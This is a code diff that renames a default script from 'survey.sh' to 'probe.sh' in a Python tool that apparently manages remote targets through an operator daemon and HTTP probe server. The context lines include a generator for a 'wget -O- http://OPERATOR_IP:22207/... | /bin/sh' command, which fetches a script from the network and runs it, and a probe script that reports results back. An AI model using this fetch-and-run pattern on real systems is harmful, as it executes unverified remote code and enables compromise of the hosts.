@@ -5507,7 +5507,7 @@ def probe_workflow_action_records(cfg, service_row=None, targets=None):
             "headless_command": command,
             "run_command": base + bridge_arg + " --run-probe-workflow-action " + shquote(f"probe:{action_id}"),
             "target_command": target_command,
-            "script_name": str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh",
+            "script_name": str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh",
             "listen_host": str(cfg.get("listen_host") or service_row.get("bind_address") or ""),
             "listen_port": port,
             "fleet_target_count": len(target_records),
@@ -11212,7 +11212,7 @@ def probe_route_context(cfg, host=None, port=None):
 
 
 def render_probe_command(cfg, host=None, port=None):
-    script_name = str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh"
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
     route = probe_route_context(cfg, host=host, port=port)
     url = f"http://{route.get('host', 'OPERATOR_IP')}:{route.get('port', 22207)}/{script_name}"
     return f"wget -O- {shquote(url)} | /bin/sh"
@@ -13625,7 +13625,7 @@ def serve_bridge(cfg, timeout, max_sessions=0, session_timeout=0):
 
 
 def probe_script_fn(cfg, host, port):
-    name = str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh"
+    name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
     url = f"http://{host}:{port}/probe/result"
     return f"""#!/bin/sh
 bb_sanitize() {{
@@ -13708,7 +13708,7 @@ def handle_probe_http(cfg, conn, method, target, headers, body, addr, script_tex
     parsed = urllib.parse.urlparse(target)
     remote = f"{addr[0]}:{addr[1]}"
     route_doc = dict(route or probe_route_context(cfg))
-    script_name = "/" + (str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh")
+    script_name = "/" + (str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh")
     if method in {"GET", "HEAD"} and parsed.path in {script_name, "/survey.sh", "/probe/probe.sh"}:
         payload = script_text.encode("utf-8")
         send_http_response(conn, 200, b"" if method == "HEAD" else payload, "text/x-shellscript", headers={
@@ -13760,7 +13760,7 @@ def serve_probe(cfg, timeout, max_sessions=0):
     if not host or host in ("0.0.0.0", "::", "127.0.0.1"):
         candidates = local_ips()
         host = candidates[0] if candidates else "OPERATOR_IP"
-    script_name = str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh"
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
     route = probe_route_context(cfg, host=host, port=port)
     route_host = str(route.get("host") or host)
     route_port = int(route.get("port") or port)
@@ -13922,7 +13922,7 @@ def daemon_child_command(cfg, service):
         command.extend(["--bridge-dest-port", str(cfg.get("bridge_dest_port", 0))])
     if service == "probe":
         command.extend(["--probe-port", str(cfg.get("GRIT_PROBE_PORT", 22207))])
-        command.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "survey.sh"))])
+        command.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
     command.extend(["--transport", service])
     command.extend(["--managed-by", "operator-daemon"])
     return command
@@ -21292,7 +21292,7 @@ def run_target_workflow_action(cfg, selector, command_input="", local_file="", r
         queued = queue_command(scoped, command, metadata={
             "work_kind": "probe",
             "workflow": "probe",
-            "request_name": str(scoped.get("GRIT_PROBE_NAME") or "survey.sh"),
+            "request_name": str(scoped.get("GRIT_PROBE_NAME") or "probe.sh"),
             "route_kind": "bridge" if scoped.get("bridge_profile") else "direct",
             "bridge_profile": str(scoped.get("bridge_profile") or ""),
         })
